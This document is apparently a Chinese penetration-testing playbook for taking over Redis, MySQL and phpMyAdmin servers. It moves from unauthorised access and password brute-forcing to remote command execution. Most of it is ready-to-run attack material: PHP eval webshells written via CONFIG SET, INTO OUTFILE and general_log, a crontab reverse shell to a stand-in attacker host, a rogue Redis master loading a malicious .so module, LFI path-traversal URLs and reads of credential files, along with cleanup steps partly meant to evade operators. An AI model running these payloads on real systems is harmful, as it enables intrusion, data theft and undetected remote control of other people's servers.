## [g-redis] Redis——未授权访问到 RCE 全家桶
### [redis-unauth] 未授权访问 | easy | 未授权访问;弱口令 | 6379;空口令
> Redis 无口令或弱口令即可连上读写任意键、改配置，是后续所有利用的入口。

#### 这个条目的作用
Redis 默认只绑定内网、默认不设密码（`requirepass` 为空），一旦暴露到公网或从内网可达，任何人都能直接连上。连上后你能：读全部缓存数据（可能含 session、token、业务数据）、修改任意键、执行 `CONFIG SET` 改配置，还能通过写文件/主从复制拿到 shell。本条目负责「怎么确认没授权、怎么枚举信息、怎么试弱口令」。它本身不直接 getshell，但它是本组后面三条（写文件、主从 RCE）的必经入口。

#### 前置条件
- 目标 6379 端口可达（公网扫到，或从已拿下的内网机器/SSRF 访问）
- 本机装有 `redis-cli`（`apt install redis-tools` 或下载官方 redis 源码编译）；没有也可用 `nc` 手工发协议
- 确认目标在你的授权测试范围内——写文件、主从加载属于真实写入，先获得许可

#### 第 1 步：探测端口开放
```bash
nmap -p 6379 -Pn 1.2.3.4
```
预期：`6379/tcp open redis`。如果没开，尝试其他端口（有的管理员把 Redis 换到 6380/16379 等）。

#### 第 2 步：直接连接尝试未授权
```bash
redis-cli -h 1.2.3.4 -p 6379
```
预期：出现 `1.2.3.4:6379>` 提示符即可输入命令。如果是 `NOAUTH Authentication required.`，说明设置了密码，跳到第 4 步试弱口令。
用 `nc` 的方式等价验证：
```bash
printf 'PING\r\n' | nc -nv 1.2.3.4 6379
# 返回 +PONG 即未授权；返回 -NOAUTH 即需要密码
```

#### 第 3 步：枚举信息
```bash
redis-cli -h 1.2.3.4 -p 6379
info                 # 版本、运行用户、路径等系统信息
keys *               # 枚举所有键（键多时用 SCAN 0 COUNT 100 代替，避免阻塞）
DBSIZE               # 键总数
CONFIG GET dir       # 数据目录
CONFIG GET dbfilename # 数据文件名
config get requirepass # 确认是否真的没密码
```
预期：`info` 里能看到 `redis_version`、`run_id`；`CONFIG GET dir` 返回当前数据目录，这是后面写马要用的关键信息。

#### 第 4 步：试弱口令
```bash
redis-cli -h 1.2.3.4 -p 6379 -a 123456
redis-cli -h 1.2.3.4 -p 6379 -a redis
redis-cli -h 1.2.3.4 -p 6379 -a foobared   # 官方默认示例密码
redis-cli -h 1.2.3.4 -p 6379 -a root
```
预期：某个口令后能正常执行 `info`。不知道口令时用爆破，例如 hydra：
```bash
hydra -P dict.txt 1.2.3.4 redis
```
如果找不到口令且目标确实需要认证，停止，换其他入口。

#### 第 5 步：确认权限后决定下一步
- 能执行 `CONFIG SET`（未被 `rename-command` 禁用）→ 走 [redis-write-file] 写文件
- 能写但目录受限、或者目标在 NAT 后面无法回连 → 评估 [redis-master-slave]
- 只读情况（`rename-command CONFIG ""`）→ 只能读数据，翻看键里有没有 session/token 等高价值内容

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 连接超时 | 目标端口没对外开放或被防火墙拦 | 换端口重扫；从内网跳板/SSRF 再试 |
| `NOAUTH Authentication required.` | 设置了 requirepass | 走弱口令爆破，或找配置文件泄露的密码 |
| `Connection refused` | Redis 只监听 127.0.0.1 | 需要先拿下本机或通过 SSRF/隧道访问 |
| `keys *` 卡住 | 线上大键库，KEYS 阻塞服务 | 用 `SCAN 0 COUNT 100` 增量枚举 |
| `-ERR unknown command CONFIG` | 管理员 rename 掉了 CONFIG | 改用主从复制路线或只做数据窃取 |

#### 实战要点
- 未授权连接的判断标准只有一个：能执行 `info` 且不报 NOAUTH。
- `info` 里 `process_id`、`config_file` 能帮你推断 Redis 以什么用户、装在哪台机器上（写马的前提）。
- 批量探测用 `nmap -p 6379 --script redis-info 1.2.3.0/24`。
- 只读枚举（info/keys）没有危害；一旦进入 CONFIG SET / 写文件阶段，确认目标在测试范围内再执行。
- 记住 `CONFIG GET dir` 的结果：后面所有写文件利用都从这里起步。
- 扫出多个 Redis 实例时优先挑 `redis_version` 4.x/5.x 的，主从 RCE 成功率最高。

### [redis-write-file] CONFIG SET 写 Webshell / SSH key / crontab | medium | 写入;getshell;反弹 | config set;dbfilename;webshell
> 有未授权写权限时，把 RDB 数据文件写到 web 根、SSH 目录或计划任务，实现 getshell。

#### 这个条目的作用
Redis 的 `SAVE` 会把内存数据落盘成 RDB 文件，文件名和目录由 `dbfilename` 和 `dir` 决定。攻击者把 `dir` 指到 web 根、`dbfilename` 改成 `shell.php`，再把一句话写进一个键，`SAVE` 后磁盘上就出现一个内容可控的 webshell——这就是「配置写文件」。同一个思路可以写 SSH 公钥（拿 SSH 登录）或写 crontab（定时反弹 shell）。本条目教你怎么从「能连 Redis」走到「能执行命令」。

#### 前置条件
- 已通过 [redis-unauth] 拿到未授权/弱口令连接
- `CONFIG SET` 未被禁用（`CONFIG GET dir` 能返回结果）
- 目标 web 目录/`/root/.ssh`/`/var/spool/cron` 对 Redis 进程用户可写
- 知道站点的绝对路径（见第 1 步）

#### 第 1 步：确认 Redis 运行权限与可写范围
```bash
redis-cli -h TARGET
info            # 看 redis_version、进程信息
CONFIG GET dir
CONFIG GET dbfilename
```
预期：拿到当前数据目录。注意：Redis 6+ 对 `dir` 的可写范围有限制（常见只允许 `/var/lib/redis` 内），如果 `CONFIG SET dir /var/www/html` 报错，说明目录被限制——此时观察 `/var/lib/redis` 里有没有可写点。

#### 第 2 步：写 Webshell（web 目录可写时）
```bash
redis-cli -h TARGET
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET payload "<?php @eval($_POST['c']);?>"
SAVE
```
预期：`OK` 返回后访问 `http://target/shell.php`，用蚁剑/`curl -d "c=system('id');"` 验证。
如果 `CONFIG SET dir` 返回 `(error) ERR Changing directory: Permission denied`，说明目录不可写，改用第 3/4 步。

#### 第 3 步：写 SSH 公钥（Redis 以 root 运行）
```bash
# 本机生成或已有密钥，把公钥包上空行写入
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > /tmp/k
cat /tmp/k | redis-cli -h TARGET -x set pub
redis-cli -h TARGET
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SAVE
ssh -i ~/.ssh/id_rsa root@TARGET
```
预期：SSH 免密登录成功。包空行是为了让 RDB 文件头部的二进制垃圾与公钥分离，否则公钥可能粘在脏数据上导致校验失败。

#### 第 4 步：写 crontab 定时反弹（Redis 以 root 运行）
```bash
redis-cli -h TARGET
CONFIG SET dir /var/spool/cron
CONFIG SET dbfilename root
SET x "\n*/1 * * * * /bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1\n"
SAVE
# Ubuntu 的路径是 /var/spool/cron/crontabs/
```
预期：攻击机 `nc -lvnp 4444` 等待，最多一分钟后收到反弹 shell。
如果目录写不进（`Permission denied`），确认 Redis 是否 root 运行：`info` 看不出来时试 `CONFIG SET dir /root` 是否报错。

#### 第 5 步：写库前的安全确认与事后恢复
写入前先记录原始配置，避免覆盖原数据导致业务故障：
```bash
CONFIG GET dir
CONFIG GET dbfilename
# 利用完恢复原样
CONFIG SET dir /var/lib/redis
CONFIG SET dbfilename dump.rdb
```
如果站点是 `redis + php` 组合且能确认 `dir` 恰好指向 web 可写目录（如 `/var/www/html`），直接写马最高效；否则优先考虑 crontab/SSH。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| `CONFIG SET dir` 报权限错误 | Redis 用户对目标目录无写权限 | 换可写目录（/tmp、/var/spool/cron、/root/.ssh）；root 运行才可能写这些 |
| 访问 shell.php 是 404 | web 根路径猜错或文件名不对 | 用 phpinfo/报错页面/目录爆破确认真实 web 路径 |
| shell.php 打开是乱码/RDB 二进制前缀 | RDB 头部脏数据 | PHP 解析会跳过 `<?php` 前的二进制，一般无碍；若被 WAF 拦截改 `GET` 参数版一句话 |
| SSH 登录报 key 格式错误 | 公钥被 RDB 脏数据粘连 | 用 `\n\n` 包裹公钥再写入，或连接后用 `ssh-keygen -y -f` 校验 |
| crontab 不执行 | 路径不对/无换行/权限 | Ubuntu 用 crontabs 路径；确认 payload 前后有换行；确认 redis 是 root |
| SAVE 后原数据丢失 | 覆盖了原 dump.rdb | 先备份原 dbfilename，利用完 CONFIG SET 回原值 |

#### 实战要点
- 三条件缺一不可：**Redis 进程权限 + 目录可写 + 绝对路径已知**；写 crontab/SSH 额外要求 Redis 以 root 运行。
- web 路径获取优先级：phpinfo 页面 > 报错回显 > 配置文件泄露 > 目录爆破。
- Redis 6+ 的 `dir` 白名单限制（默认 `/var/lib/redis`）会挡住大部分写马，但数据库文件目录内的可写点（如 `.ssh`）仍可利用。
- 写库前 `CONFIG GET dir/dbfilename` 拍照留档，利用完恢复原值，避免业务雪崩。
- crontab 里的路径 `*/1` 是每分钟执行；调试时把反弹 IP/端口写对，先本地 `nc -lvnp` 再触发。
- ⚠️ 这些手法会真实写入并可能覆盖生产数据，只在授权目标上按第 5 步做恢复。

### [redis-master-slave] 主从复制加载 .so RCE | hard | 未授权访问;RCE;加载模块 | rogue-server;MODULE LOAD
> 伪造恶意 Redis 主库，让目标同步加载恶意 .so 模块实现任意命令执行。

#### 这个条目的作用
当 Redis 4.x/5.x 开放且能执行 `SLAVEOF`，但 `CONFIG SET dir` 写文件路线走不通（目录受限/非 root）时，用「主从复制 + 恶意模块」拿 RCE：攻击机起一个伪造的 Redis 主库，目标执行 `SLAVEOF` 后按 `FULLRESYNC` 把「数据文件」原样同步下来——但这个"数据文件"其实是恶意 `.so` 动态库。接着 `MODULE LOAD` 加载它，模块导出 `system.exec` 等命令接口，实现任意命令执行。

#### 前置条件
- 未授权/弱口令连接（同 redis-unauth）
- Redis 版本 4.x/5.x（6+ 默认限制 `MODULE LOAD`，成功率骤降）
- 目标能**主动出网回连**攻击机端口（主从复制是目标连攻击机，NAT 后无法回连则放弃）
- 下载好工具：redis-rogue-server / redis-rce（GitHub 上开源的利用框架）

#### 第 1 步：确认版本与可利用性
```bash
redis-cli -h TARGET info | grep redis_version
redis-cli -h TARGET config get dir
```
预期：`redis_version:4.x.x` 或 `5.x.x`。之后确认 `SLAVEOF` 未被禁用（直接在第 3 步试）。
如果 `CONFIG GET dir` 都能用且目录可写，优先走写文件（redis-write-file），主从是备选，因为它动静大。

#### 第 2 步：准备恶意主库工具与 exp.so
```bash
git clone https://github.com/n0b0dyCN/redis-rogue-server.git
cd redis-rogue-server
python3 redis-rogue-server.py --help
```
工具里自带编译好的 `exp.so`（内含 `system.exec` 命令接口）。如果平台不匹配，需在目标同架构机器上重新编译（`gcc -shared -fPIC -o exp.so exp.c -ldl`）。

#### 第 3 步：一键攻击
```bash
python3 redis-rogue-server.py --rhost TARGET --lhost ATTACKER_IP
# 交互输入命令，例如
system.exec id
system.exec whoami
```
预期：工具自动完成「SLAVEOF 攻击机 → 传输 exp.so → MODULE LOAD → 建立命令交互」。输入 `system.exec id` 返回 uid 信息即成功。

#### 第 4 步：手动等价流程（工具不可用时）
```bash
# 攻击机先起恶意主库（另一终端，用工具或自己写的伪造 server，监听 21000）
redis-cli -h TARGET
SLAVEOF ATTACKER 21000          # 目标变成从库，开始同步恶意文件
# 等 FULLRESYNC 完成（同步下来的"数据"就是 exp.so，落在 dir 目录）
CONFIG SET dir /tmp              # 确保模块路径可写可载
MODULE LOAD /tmp/exp.so          # 加载恶意模块
system.exec id                   # 模块提供的命令接口
```
预期：`MODULE LOAD` 返回 `OK`，随后 `system.exec` 可执行任意系统命令。

#### 第 5 步：利用后清理
```bash
redis-cli -h TARGET
system.exec rm /tmp/exp.so       # 按模块接口删除落盘文件
MODULE UNLOAD exp                # 卸载模块（模块名看 MODULE LIST）
SLAVEOF NO ONE                   # 解除主从关系，恢复独立主库
```
> [!warn] 不清理的话：目标长期处于"从库"状态不处理写请求、模块文件残留、主从配置留在配置文件里，极易被运维发现。高强度环境慎用主从手法。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| `SLAVEOF` 报 `ERR Unable to connect` | 目标回连攻击机失败（防火墙/NAT/出网限制） | 换公网 VPS 当攻击机；确认入站端口放行 |
| 同步后 `MODULE LOAD` 报格式错误 | 目标与 exp.so 架构/平台不匹配 | 按目标系统重编 exp.so，或换预编译版本 |
| Redis 6+ 拒绝 MODULE LOAD | 6+ 默认关闭模块加载（受 ACL/配置限制） | 优先写文件路线；或找 `enable-module-command` 配置宽松的环境 |
| 攻击后 Redis 不再响应写 | 目标仍是从库，主从未恢复 | 执行 `SLAVEOF NO ONE` 恢复 |
| `system.exec` 无此命令 | 模块接口名不同（有的叫 `system.exec`，有的叫 `pwn`） | `MODULE LIST` 看模块名，`CMD 模块名.help` 查接口 |
| 卡在 FULLRESYNC | 恶意主库没发完整 payload | 重跑工具；确认工具监听端口与 SLAVEOF 的端口一致 |

#### 实战要点
- 这是一条**出网依赖**链：目标必须主动连回攻击机，内网孤立主机/严格出口策略下直接放弃，不浪费时间。
- 优先级判断：先试写文件（redis-write-file），`CONFIG SET dir` 都受限再上主从——主从动静大、易被发现。
- 攻击前 `info` 看版本：4.x/5.x 首选，6+ 评估后再决定。
- 攻击机端口要固定并放行，工具与 `SLAVEOF` 指向的 IP:端口必须精确一致。
- 利用完按第 5 步完整清理：删模块文件 → 卸载模块 → `SLAVEOF NO ONE`。
- 主从手法默认目标以 redis 用户运行，getshell 后通常还要找提权点（sudo/内核漏洞），别以为拿到命令就一定是 root。

## [g-db] MySQL 与数据库——弱口令、写马与日志
### [mysql-weak-outfile] root 弱口令与 INTO OUTFILE 写马 | medium | 弱口令;写马;secure_file_priv | outfile;load_file
> root/空、root/123456 等弱口令连上后，FILE 权限 + 已知路径即可把 shell 写进 web 根。

#### 这个条目的作用
MySQL 的 `SELECT ... INTO OUTFILE` 能把查询结果直接写成服务器上的文件。如果数据库账号带 `FILE` 权限（root 默认有）、`secure_file_priv` 没限制、你又知道 web 绝对路径，就能把一句话木马写进 web 根目录 getshell。同一权限还能用 `LOAD_FILE` 读服务器任意文件（配置文件、源码、密钥）。本条目覆盖：弱口令连接 → 权限确认 → 写马 → 读文件 → 失败回退。

#### 前置条件
- MySQL 3306 端口可达（公网暴露，或从已拿下的内网机器连接）
- 本机有 mysql 客户端：`apt install default-mysql-client`，或 `mysql -h` 直接可用
- 目标站点为 PHP/其他解释型语言且 web 根可写——写马才有意义
- 目标在授权测试范围内

#### 第 1 步：弱口令连接
```bash
mysql -h TARGET -u root -p
# 密码留空直接回车
mysql -h TARGET -u root -proot
mysql -h TARGET -u root -p123456
mysql -h TARGET -u root -proot123
# 常用弱口令表：空 / root / 123456 / root123 / toor / admin
```
预期：进入 `mysql>` 提示符。失败换口令继续试；全失败可用 `hydra -l root -P dict.txt TARGET mysql` 爆破。
> [!tip] 3306 不通时看站点是否开 33060（X 协议）或从 phpMyAdmin 之类入口横向连。

#### 第 2 步：确认权限与导出限制
```sql
SELECT VERSION();
SHOW VARIABLES LIKE 'secure_file_priv';
SELECT @@global.secure_file_priv;
SHOW GRANTS FOR CURRENT_USER();
```
预期与解读：
- `secure_file_priv` 值为 `NULL` → 导出被禁止，此条目作废，改走 [mysql-general-log]。
- 值为空串 `''` → 不限制目录，任意路径可写。
- 值为一个路径（如 `/var/lib/mysql-files/`）→ 只能写该路径，需结合目录下是否有 web 可写点。
- `SHOW GRANTS` 里要含 `FILE` 权限（root 默认有）。

#### 第 3 步：确认/寻找 web 绝对路径
写马必须知道站点的磁盘绝对路径，优先级：
1. phpinfo 页面（`DOCUMENT_ROOT`、`SCRIPT_FILENAME`）
2. 报错回显（触发一个 PHP 错误看路径）
3. 站点配置文件泄露（`config.php`、`.env`）
4. 用 `@@datadir`、`@@basedir` 辅助推断：
```sql
SELECT @@datadir, @@basedir;
```
预期：拿到形如 `/var/www/html`、`/usr/share/nginx/html` 的路径。路径猜不到时，测试报错 `SELECT extractvalue(1,concat(0x7e,(SELECT @@datadir)))` 让路径出现在报错里。

#### 第 4 步：INTO OUTFILE 写马
满足「FILE 权限 + secure_file_priv 不限制 + 路径已知」后执行：
```sql
SELECT '<?php @eval($_POST[cmd]);?>' INTO OUTFILE '/var/www/html/shell.php';
-- 或者用 shell_exec 版，方便纯 GET 验证
SELECT '<?php echo shell_exec($_GET[c]);?>' INTO OUTFILE '/var/www/html/s.php';
```
预期：`Query OK, 1 row affected`。访问 `http://target/shell.php`，POST `cmd=system('id');` 或 GET `?c=id` 验证。
如果报 `ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option` → 见第 6 步回退。

#### 第 5 步：LOAD_FILE 读服务器文件
```sql
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');
SELECT LOAD_FILE('/etc/nginx/nginx.conf');
SELECT LOAD_FILE('/proc/self/environ');   -- 可能泄露环境变量/密钥
```
预期：返回文件内容。返回 `NULL` 通常是权限不足或路径不对，换文件试。
> [!warn] 读到的配置文件里常有数据库口令、密钥、后台地址，进一步扩大战果，但只读、别乱动线上数据。

#### 第 6 步：写马失败时的排查与回退
写马失败九成是 `secure_file_priv` 限制或路径不可写，按顺序排查：
1. `SELECT @@global.secure_file_priv;` 是否空串——NULL 直接改走 general_log 手法。
2. 确认路径不是目录而是文件路径、目录真实存在。
3. 确认 mysqld 进程对目标目录有写权限（web 根是 nginx 用户写的，mysqld 未必能写；可试试 `/tmp` 验证导出是否通）。
4. 一条语句写两个文件以上会报 `The MySQL server is running with the --secure-file-priv option so it cannot execute this statement`，一次只写一个。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| `Access denied for user` | 账号或口令不对 | 换弱口令/爆破；确认连的是数据库不是别的服务 |
| `ERROR 1290` secure-file-priv 报错 | 导出被限制 | 看 `@@global.secure_file_priv` 值；NULL 走 general_log，路径限制则找该路径内可写点 |
| `ERROR 1 (HY000): Can't create/write to file` | 目录不存在或 mysqld 无写权限 | 换 `/tmp` 验证导出能力；确认绝对路径拼写 |
| 写入成功但访问 404 | web 根猜错/站点端口不同 | 用 phpinfo/错误页确认真实 DOCUMENT_ROOT |
| LOAD_FILE 返回 NULL | 权限不足或文件不存在 | 先读 `/etc/passwd` 验证基本权限；后台溢出文件换 `/proc/self/environ` |
| shell.php 打开是空白文本 | 写进去的是文本不是 PHP | 确认 php 解析路径与扩展名；`<?php ?>` 标签写全 |

#### 实战要点
- **四条全满足才成**：FILE 权限 + secure_file_priv 允许 + 绝对路径已知 + 目录可写，缺一即失败。
- MySQL 5.7+ 默认 `secure_file_priv=NULL` 直接禁导出，遇此别死磕，切 general_log。
- `DUPLICATE` 报错/`extractvalue` 报错能回显路径，是找绝对路径的稳妥技巧。
- outfile 写马会被字节序标记污染（`0xEFBBBF` BOM 等），PHP 解析一般无碍，但内容敏感时用 `HEX(0x...)` 转 hex 再写更干净。
- 读文件优先读 `config.php`、`.env`、`nginx.conf`——里面往往是下一跳凭证。
- `LOAD_FILE` 与 `INTO OUTFILE` 共用同一个写马权限池，读了能写、写了能读，先读后写顺序更稳。

### [mysql-general-log] general_log 日志写马 | medium | 日志写马;secure_file_priv 绕过 | general_log;general_log_file
> 把通用查询日志指到 web 目录，任意 SQL 语句都会成为日志内容，一行 SQL 即一行马。

#### 这个条目的作用
`secure_file_priv=NULL` 封死 `INTO OUTFILE` 时的首选绕过：MySQL 的 general_log（通用查询日志）会记录每一条执行的 SQL 语句。攻击者把 `general_log_file` 改指向 web 目录下的 `.php` 文件，然后执行一句把木马当 SQL 的语句，这行"日志"就被写进文件——等于用日志通道写马，完全绕开文件导出限制。本条目覆盖：开启日志 → 改路径 → 写入木马 → 验证 → 清理。

#### 前置条件
- 已能连接 MySQL 且账号有 `SUPER` 权限（root 默认有；普通账号 `SHOW GRANTS` 确认 `SUPER`）
- 知道 web 绝对路径（phpinfo / 报错 / 配置泄露，方法同 mysql-weak-outfile 第 3 步）
- 目标目录对 mysqld 进程可写
- 适用于 `secure_file_priv` 为 NULL 或路径受限、outfile 写不进的情况

#### 第 1 步：确认权限（必须 SUPER）
```sql
mysql -h TARGET -u root -p
SHOW GRANTS FOR CURRENT_USER();
-- 或直接试
SET global general_log = 'ON';
```
预期：`Query OK`。如果报 `ERROR 1227 (42000): Access denied; you need (at least one of) the SUPER privilege(s)`，说明账号权限不够，此手法不可用（换弱口令 root 或找其他账号）。

#### 第 2 步：把日志文件改到 web 目录
```sql
SET global general_log = 'ON';
SET global general_log_file = '/var/www/html/shell.php';
```
预期：两步都返回 `Query OK`。
> [!danger] 从这一步起，之后执行的**每一条 SQL**都会追加进 shell.php。尽快完成第 3 步写马，别在开启状态下做大量其他查询，日志会被塞满杂语句。

#### 第 3 步：写入木马
```sql
SELECT '<?php @eval($_POST[c]);?>';
```
预期：`Query OK`。访问 `http://target/shell.php`，POST `c=system('id');` 验证。
日志文件的行首会带时间戳等日志前缀，但 `<?php` 前的文本 PHP 会按 HTML 输出，`<?php ... ?>` 部分正常解析，一般可直接用。

#### 第 4 步：验证与清理
```bash
curl -d "c=system('id');" http://target/shell.php
```
预期：返回 `uid=...` 等命令输出。
确认 shell 可用后立即清理，防止日志继续增长并避免被安全设备发现：
```sql
SET global general_log = 'OFF';
SET global general_log_file = '/var/lib/mysql/hostname.log';  -- 恢复原路径
```
> [!warn] 不关日志的话，之后所有访问者的 SQL 都会写进你的 shell.php，文件快速膨胀，还等于把攻击行为实时记录给运维。用完必关。

#### 第 5 步：备选方案 slow_query_log
原理与 general_log 完全一致，只是用慢查询日志：
```sql
SET global slow_query_log = 'ON';
SET global slow_query_log_file = '/var/www/html/slow.php';
SELECT '<?php @eval($_POST[c]);?>', SLEEP(5);
-- 或
SELECT '<?php @eval($_POST[c]);?>', IF(1=1,SLEEP(5),0);
```
预期：`SLEEP(5)` 使语句被判定为慢查询落入日志文件，同样得到 shell.php。
slow_query_log 在部分环境默认关闭、开启后写入更克制，适合 general_log 被监控/日志文件塞满时切换。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| `ERROR 1227` SUPER 权限不足 | 账号是普通用户 | 换 root 弱口令；或寻找带 SUPER 的账号 |
| `ERROR 1231` 变量值不合法 | general_log_file 值非绝对路径或含非法字符 | 写完整绝对路径；先 `SHOW VARIABLES LIKE 'general_log_file'` 看默认值格式 |
| 访问 shell.php 是 404 | web 路径错/扩展名/权限 | 确认 DOCUMENT_ROOT；确认目录对 mysqld 可写 |
| shell.php 能访问但没执行 | 日志前缀污染、`<?php` 前有 `--` 注释 | 换带闭合良好的一句话（多写几遍让某行凑巧干净）；用蚁剑测试真实执行 |
| 写马后日志疯狂增长 | 忘了关 general_log | 立刻 `SET global general_log='OFF'` 并恢复文件路径 |
| 语句被记录成转义/注释 | 客户端对 `;` 或引号做了处理 | 避免用 `--` 结尾的注释；直接 `SELECT '<?php ...?>';` 单行完成 |

#### 实战要点
- **不依赖 secure_file_priv**，这是它作为 outfile 绕过手段的核心价值——NULL 限制下它是写马第一选择。
- 需要 `SUPER` 权限（root 默认），且目录可写、绝对路径已知三条件仍缺一不可。
- 从 `general_log='ON'` 到写马完成之间，**只执行必要的语句**，减少日志污染。
- 日志行带时间戳/来源前缀，马体可能被夹杂注释，这是正常现象，用蚁剑验证而非肉眼判断。
- 用完后恢复 `general_log_file` 原路径并关闭开关，既是隐藏痕迹也是防止文件膨胀。
- `slow_query_log` 同原理，作为被 general_log 占用/监控时的 Plan B，`SLEEP(5)` 触发慢查询。

### [phpmyadmin] phpMyAdmin 弱口令与利用 | easy | 弱口令;管理后台;写马 | pma;CVE-2018-12613
> pma 后台弱口令直连 MySQL，等于拥有图形化 SQL 终端，写马读文件一步到位。

#### 这个条目的作用
phpMyAdmin 是 MySQL 的 Web 管理后台，登录成功等于获得一个图形化 SQL 终端——不用装 mysql 客户端、不用管内网 3306 是否可达。登录后能执行任意 SQL：`INTO OUTFILE` 写马、general_log 写马、`LOAD_FILE` 读服务器文件，还能看库表数据翻敏感信息。另外 4.8.0–4.8.1 存在 CVE-2018-12613 本地文件包含（LFI），部分版本无需登录即可读任意文件。本条目覆盖：找入口 → 弱口令 → SQL 利用三板斧 → LFI → 判定数据库归属。

#### 前置条件
- 目标 web 上部署了 phpMyAdmin（常见路径见第 1 步）
- 有可试的弱口令组合（root 空/root:root/root:123456 等）
- 写马类利用仍需满足对应手法的前提（FILE/SUPER 权限、路径已知、目录可写）

#### 第 1 步：发现 pma 入口
```bash
# 常见路径逐个探测
curl -s -o /dev/null -w "%{http_code} %{url_effective}\n" \
  http://target/phpmyadmin/ http://target/pma/ http://target/db/ \
  http://target/phpMyAdmin/ http://target/mysql/
# 也可以用目录爆破工具扫描
```
预期：某个路径返回 200 且页面标题含 phpMyAdmin / 出现登录框。
pma 常与域名子路径组合（`/admin/pma/`），爆破字典要带常见子目录。

#### 第 2 步：弱口令登录
浏览器打开登录页，依次尝试：
- 用户 `root`，密码留空
- `root / root`、`root / 123456`、`root / root123`、`root / toor`
- `admin / admin`、`admin / 123456`、`test / test`
预期：登录成功进入面板（左侧库列表）。失败的常见表现是"登录失败"红字。
> [!tip] pma 有登录频率与 IP 尝试限制（`LoginCookieValidity`/`blowfish_secret` 相关）时，爆破要慢速；先手试最有把握的组合。

#### 第 3 步：确认环境与数据库归属
登录后点顶部「SQL」选项卡，执行：
```sql
SELECT @@version, @@hostname, @@datadir, @@basedir;
SELECT @@global.secure_file_priv;
SHOW GRANTS FOR CURRENT_USER();
```
预期：拿到版本、主机名、数据目录。**关键判断**：pma 所在的 Web 服务器可能与 MySQL 不在同一台机器（分离部署很常见），写马时目标路径属于 MySQL 所在主机，别把 web 路径想当然。
`@@version` 形如 `5.7.33` 是 MySQL；`8.0.x` 是 MySQL 8；还有 MariaDB（`5.5.5-10.x`）——导出限制/权限模型略有差异，但下面手法通用。

#### 第 4 步：写马三板斧（在 SQL 选项卡执行）
第一招 INTO OUTFILE（需 FILE 权限且 secure_file_priv 为空串）：
```sql
SELECT '<?php @eval($_POST[c]);?>' INTO OUTFILE '/var/www/html/pma_shell.php';
```
第二招 general_log（需 SUPER，secure_file_priv 为 NULL 时的首选）：
```sql
SET global general_log = 'ON';
SET global general_log_file = '/var/www/html/pma_shell.php';
SELECT '<?php @eval($_POST[c]);?>';
SET global general_log = 'OFF';
```
第三招读文件拿配置：
```sql
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.inc.php');  -- pma 自身的配置文件
```
预期：分别得到 shell/文件内容。通用前提与排查方式完全同 [mysql-weak-outfile] 与 [mysql-general-log]。

#### 第 5 步：CVE-2018-12613 本地文件包含（4.8.0–4.8.1）
不登录或登录后均可尝试（部分版本无需认证）：
```
http://target/phpmyadmin/index.php?target=db_sql.php%253f/../../../../etc/passwd
```
预期：返回 `/etc/passwd` 内容。重点解读：
- `%253f` 是 `%3f` 的二次编码（`?` 被 pma 过滤后仍可穿透），实际解码链：`%253f` → `%3f` → `?`。
- 配合 `target=db_sql.php%253f/../../../../phpmyadmin/index.php` 之类的路径可读 pma 自身源码。
- 能读 `config.inc.php` 就能拿 `blowfish_secret`、数据库账号；配合写马条件可升级 RCE。
> [!warn] 该漏洞影响 4.8.0–4.8.1，4.8.2 已修复；版本高于 4.8.1 直接跳过此步。

#### 第 6 步：确认写马结果与收尾
```bash
curl -d "c=system('id');" http://target/pma_shell.php
```
预期：返回命令执行结果。随后清理：删除 shell 文件、恢复 general_log 配置、退出登录并清理浏览器 session。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 登录一直失败 | 口令不对或账号非 root | 换用户组合（admin/test）；看页面是否有验证码/频率限制 |
| 登录成功却看不到库 | 账号权限低（只授权了某库） | 用该账号能看到的库继续；权限不足的 SQL 会报 Access denied |
| SQL 执行报 1290 | secure_file_priv 限制导出 | 改 general_log 手法；先 `SELECT @@global.secure_file_priv` 判断 |
| 写马进 web 根 404 | pma 与数据库分离部署，路径在 DB 主机 | `SELECT @@hostname` 对比 web 主机；确认 MySQL 所在主机的 web 可写目录 |
| LFI 返回空白/404 | 版本不对（>4.8.1）或路径编码错 | 确认版本；`target=db_sql.php%253f/../../../../etc/passwd` 的 `%253f` 别少一层编码 |
| pma 页面 403 | 目录访问控制（IP 白名单/Nginx deny） | 换路径/换入口；从已拿下的内网机器访问 |
| 面板加载慢/超时 | pma 版本旧、PHP 版本不兼容 | 慢速手测，别依赖爆破工具 |

#### 实战要点
- pma 写马手法与 mysql-weak-outfile / mysql-general-log 完全一致，**先确认 `@@hostname` 判断 pma 与数据库是否同机**，再决定往哪写。
- 弱口令优先级：`root` 空密码 > `root:root` > `root:123456`，实测覆盖大半场景。
- CVE-2018-12613 是免费午餐：4.8.0–4.8.1 无需登录即可 LFI，先测 target 参数再看口令。
- pma 自身的 `config.inc.php` 是宝库：`blowfish_secret`、数据库口令、甚至域名配置全在里面。
- pma 面板里能看所有库的敏感数据（用户表、session 表），只读信息也是战果，写马前先翻一遍。
- 利用完务必清理 shell 与日志配置；pma 管理后台有审计日志，高强度环境操作要克制。